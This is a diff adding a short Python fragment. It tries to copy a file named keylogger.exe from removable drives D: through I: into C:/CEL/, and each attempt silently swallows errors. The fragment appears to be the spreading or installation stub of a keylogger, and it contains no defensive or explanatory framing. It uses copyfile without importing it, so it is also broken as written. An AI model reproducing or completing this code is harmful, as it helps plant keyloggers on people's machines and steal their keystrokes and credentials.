@@ -1,0 +1,20 @@
+### COPY ONLY IF IS VISIBLE
+
+
+
+from contextlib import suppress
+
+def copy_pase():
+
+        with suppress(Exception):
+            copyfile('D:/keylogger.exe', 'C:/CEL/keylogger.exe')
+        with suppress(Exception):
+            copyfile('E:/keylogger.exe', 'C:/CEL/keylogger.exe')
+        with suppress(Exception):
+            copyfile('F:/keylogger.exe', 'C:/CEL/keylogger.exe')
+        with suppress(Exception):
+            copyfile('G:/keylogger.exe', 'C:/CEL/keylogger.exe')
+        with suppress(Exception):
+            copyfile('H:/keylogger.exe', 'C:/CEL/keylogger.exe')
+        with suppress(Exception):
+            copyfile('I:/keylogger.exe', 'C:/CEL/keylogger.exe')
